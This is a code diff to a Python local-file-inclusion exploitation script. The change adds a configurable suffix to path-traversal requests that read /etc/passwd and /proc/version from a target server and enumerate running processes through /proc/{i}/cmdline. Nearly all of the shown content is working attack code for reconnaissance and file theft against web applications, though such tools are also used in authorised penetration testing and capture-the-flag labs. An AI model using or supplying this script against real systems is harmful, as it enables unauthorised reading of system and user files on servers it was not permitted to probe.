@@ -42,7 +42,7 @@ def main():
     parser.add_argument("--max", default=1000, type=int)
     parser.add_argument("--param", default="file", help="LFI parameter name")
     parser.add_argument("--path-starting", default="file", help="LFI parameter starting point (example: file://)")
-    parser.add_argument("--path-ending", default="file", help="LFI parameter ending point (example: *percent_sign*23 for #)")
+    parser.add_argument("--path-ending", default="file", help="LFI parameter ending point (example: *percent_sign*23 for hashtag)")
 
     args = parser.parse_args()
 
@@ -64,7 +64,7 @@ def main():
 
     print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} Target: {base}")
 
-    test_url = f"{base}/{args.path}?{args.param}={args.path_starting}../../../../etc/passwd"
+    test_url = f"{base}/{args.path}?{args.param}={args.path_starting}../../../../etc/passwd{args.path_ending}"
     test = requests.get(test_url, timeout=3)
 
     if "root:x:" not in test.text:
@@ -77,14 +77,14 @@ def main():
             print(f"{Fore.CYAN}[/]{Style.RESET_ALL} User found: {usr[0]}, Home: {usr[1]}")
         
 
-    ver_url = f"{base}/{args.path}?{args.param}={args.path_starting}../../../../proc/version"
+    ver_url = f"{base}/{args.path}?{args.param}={args.path_starting}../../../../proc/version{args.path_ending}"
     ver = requests.get(ver_url, timeout=3)
     print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} OS Version: {ver.text.strip()}\n")
 
     host_len = 0
 
     for i in range(1, args.max + 1):
-        url = f"{base}/{args.path}?{args.param}={args.path_starting}../../../../proc/{i}/cmdline"
+        url = f"{base}/{args.path}?{args.param}={args.path_starting}../../../../proc/{i}/cmdline{args.path_ending}"
 
         try:
             r = requests.get(url, timeout=3)
